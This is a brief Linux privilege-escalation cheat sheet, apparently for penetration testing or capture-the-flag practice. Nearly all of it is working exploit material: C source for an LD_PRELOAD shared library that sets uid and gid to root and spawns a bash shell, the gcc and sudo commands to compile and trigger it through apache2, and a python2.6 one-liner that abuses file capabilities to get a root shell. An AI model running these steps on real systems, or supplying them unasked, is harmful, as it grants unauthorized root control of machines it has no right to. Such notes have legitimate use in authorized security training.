### Detection
```
sudo -l
LD_PRELOAD environment variable is intact
```
### Exploitation
```
nano /tmp/shell.c

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
### Compile and Execute
```
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
ls
sudo LD_PRELOAD=/tmp/shell.so apache2
id
```
### Escalation via Capabilities
```
$ getcap -r / 2>/dev/null
$ /usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/sh")'
